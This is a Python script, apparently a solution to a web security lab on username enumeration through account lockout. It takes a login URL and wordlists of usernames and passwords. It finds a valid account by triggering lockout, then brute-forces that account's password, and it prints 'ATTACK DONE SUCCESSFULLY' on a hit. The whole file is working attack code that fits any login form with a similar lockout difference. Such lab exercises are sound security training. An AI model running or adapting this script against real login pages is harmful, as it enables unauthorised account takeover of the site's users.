# created by sm6r,2024
# Lab: Username enumeration via account lock
#

import requests
import sys

if len(sys.argv)!=2:
    print("Usage: solution.py LOGIN_URL")
    exit()

url = sys.argv[1]
users= open("usernames.txt","r")
passes= open("passwords.txt","r")
response = requests.post(url,{'username':'xxxxxxx','password':"xxxxxxxx"})
length = len(response.text)
flg = True
if response.text.find("Gateway Timeout") != -1:
    print("Invalid URL .... ")
    exit()


for user in users:
    user = user.strip()
    print(f"Username: {user}",end="  "*len(user)+"\r")
    for i in range(5):
        response=requests.post(url,{'username':user,'password':"xxxxxxxx"})

        if i == 4 and len(response.text) != length:
            print("\nThis user got locked,now BruteForcing the password")

            for password in passes.readlines():
                password = password.strip()
                print(f"Password: {password}",end="  "*len(password)+"\r")
                response=requests.post(url,{'username':user,'password':password})

                if response.text.find('You have made too many incorrect login attempts. Please try again in 1 minute(s)') == -1:
                    print("\nFound the valid credentials\nATTACK DONE SUCCESSFULLY")
                    break
            flg = False 
    if not flg:
        break


if flg:
   print("DIDNT FIND ANY VALID CREDENTIALS")


